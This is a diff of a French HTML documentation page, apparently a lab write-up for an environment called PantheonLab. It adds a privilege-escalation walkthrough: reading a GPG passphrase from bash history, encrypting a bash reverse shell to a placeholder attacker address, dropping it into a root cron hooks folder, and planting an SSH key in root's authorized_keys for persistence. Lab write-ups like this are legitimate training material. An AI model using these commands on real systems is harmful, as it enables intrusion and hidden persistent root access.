@@ -851,21 +851,54 @@
     </span>
   </a>
   
-</li>
+    <nav class="md-nav" aria-label="1. Exploitation des Vulnérabilités Locales">
+      <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#2-utilisation-des-droits-dadministrateur" class="md-nav__link">
+  <a href="#contexte" class="md-nav__link">
     <span class="md-ellipsis">
-      2. Utilisation des Droits d'Administrateur
+      Contexte
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#3-techniques-de-persistance" class="md-nav__link">
+  <a href="#analyse-du-mecanisme" class="md-nav__link">
     <span class="md-ellipsis">
-      3. Techniques de Persistance
+      Analyse du mécanisme
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#resume" class="md-nav__link">
+    <span class="md-ellipsis">
+      Résumé
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-techniques-de-persistance" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Techniques de Persistance
     </span>
   </a>
   
@@ -1097,21 +1130,54 @@
     </span>
   </a>
   
-</li>
+    <nav class="md-nav" aria-label="1. Exploitation des Vulnérabilités Locales">
+      <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#2-utilisation-des-droits-dadministrateur" class="md-nav__link">
+  <a href="#contexte" class="md-nav__link">
     <span class="md-ellipsis">
-      2. Utilisation des Droits d'Administrateur
+      Contexte
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#3-techniques-de-persistance" class="md-nav__link">
+  <a href="#analyse-du-mecanisme" class="md-nav__link">
     <span class="md-ellipsis">
-      3. Techniques de Persistance
+      Analyse du mécanisme
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#resume" class="md-nav__link">
+    <span class="md-ellipsis">
+      Résumé
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-techniques-de-persistance" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Techniques de Persistance
     </span>
   </a>
   
@@ -1155,8 +1221,50 @@
 <p>Cette section détaille les techniques d'élévation de privilèges utilisées dans l'environnement PantheonLab.</p>
 <h2 id="methodes-delevation-de-privileges">Méthodes d'Élévation de Privilèges</h2>
 <h3 id="1-exploitation-des-vulnerabilites-locales">1. Exploitation des Vulnérabilités Locales</h3>
-<h3 id="2-utilisation-des-droits-dadministrateur">2. Utilisation des Droits d'Administrateur</h3>
-<h3 id="3-techniques-de-persistance">3. Techniques de Persistance</h3>
+<p>Dans cet environnement, l'utilisateur <code>hera</code> dispose de droits suffisants pour exploiter un mécanisme d'élévation de privilèges automatisé.</p>
+<h4 id="contexte">Contexte</h4>
+<p>Un dossier <code>/opt/hooks</code> contient des scripts qui sont automatiquement exécutés par l'utilisateur <code>root</code> via une tâche cron toutes les minutes. Cependant, ces scripts sont chiffrés avec GPG, ce qui semble empêcher une modification directe.</p>
+<h4 id="analyse-du-mecanisme">Analyse du mécanisme</h4>
+<p>En listant le contenu de <code>/opt/hooks</code>, on remarque la présence de scripts chiffrés (extension <code>.gpg</code>). Un examen plus approfondi du système révèle que le mot de passe utilisé pour le chiffrement GPG est stocké en clair dans le fichier <code>~/.bash_history</code> de l'utilisateur <code>hera</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>cat<span class="w"> </span>~/.bash_history
+</code></pre></div>
+<h4 id="exploitation">Exploitation</h4>
+<ol>
+<li><strong>Préparation de l'écoute sur la machine d'attaque</strong> :
+   Avant de déposer le script, il faut lancer un listener netcat sur sa propre machine pour recevoir la connexion :</li>
+</ol>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span>&lt;PORT&gt;
+</code></pre></div>
+<ol>
+<li><strong>Création d'un reverse shell</strong> :
+   On commence par écrire un script bash qui ouvre un reverse shell vers notre machine d'attaque :</li>
+</ol>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/&lt;IP_ATTAQUANT&gt;/&lt;PORT&gt;<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div>
+<ol>
+<li><strong>Chiffrement du script</strong> :
+   On chiffre ce script avec GPG en utilisant le mot de passe récupéré :</li>
+</ol>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>gpg<span class="w"> </span>--symmetric<span class="w"> </span>--passphrase<span class="w"> </span>&lt;mot_de_passe&gt;<span class="w"> </span>reverseshell.sh
+</code></pre></div>
+   Cela génère un fichier <code>reverseshell.sh.gpg</code>.</p>
+<ol>
+<li><strong>Dépôt dans /opt/hooks</strong> :
+   On place le fichier chiffré dans <code>/opt/hooks</code> :</li>
+</ol>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>cp<span class="w"> </span>reverseshell.sh.gpg<span class="w"> </span>/opt/hooks/
+</code></pre></div>
+<ol>
+<li><strong>Attente de l'exécution</strong> :
+   Il suffit alors d'attendre une minute pour que la tâche cron exécutée par root déchiffre et lance le script, ouvrant ainsi un shell root sur la machine d'attaque.</li>
+</ol>
+<h4 id="resume">Résumé</h4>
+<p>Ce scénario montre l'importance de ne jamais stocker de mots de passe sensibles en clair, et de bien contrôler les scripts exécutés automatiquement avec des privilèges élevés.</p>
+<h3 id="2-techniques-de-persistance">2. Techniques de Persistance</h3>
+<p>Après avoir obtenu un accès root, la méthode de persistance la plus simple et discrète consiste à ajouter sa propre clé publique SSH dans le fichier <code>~/.ssh/authorized_keys</code> de l'utilisateur root :</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;clé_publique&gt;&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/root/.ssh/authorized_keys
+</code></pre></div>
+<p>Cela permet de se reconnecter facilement en tant que root sans avoir besoin du mot de passe.</p>
 <h2 id="conclusion">Conclusion</h2>
 <p>L'élévation de privilèges est une étape cruciale dans l'exploitation d'un environnement Active Directory. </p>
 
@@ -1181,7 +1289,7 @@
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="July 5, 2025 00:39:38 UTC">July 5, 2025</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="July 6, 2025 14:59:53 UTC">July 6, 2025</span>
   </span>
 
     
